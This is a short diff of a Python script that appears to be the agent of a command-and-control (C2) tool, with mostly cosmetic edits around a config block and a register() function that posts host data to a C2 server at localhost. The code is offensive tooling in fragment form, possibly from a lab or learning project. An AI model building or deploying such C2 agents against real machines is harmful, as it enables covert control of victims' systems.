@@ -8,9 +8,12 @@ import os
 #import subprocess
 import time
 
-# configs: 
+### configs ###
+
 c2_url = "http://127.0.0.1:5000"
 register_uri = "/register_agent"
+
+### configs end ###
 
 agent_id = None
 
@@ -32,7 +35,6 @@ def register():
     """
         register the agent with the C2 server
     """
-    global agent_id
     data = init_data()
     print("[+] Registering agent with C2 server...")
     r = requests.post(c2_url + register_uri, json=data) ## sending the data to C2 server
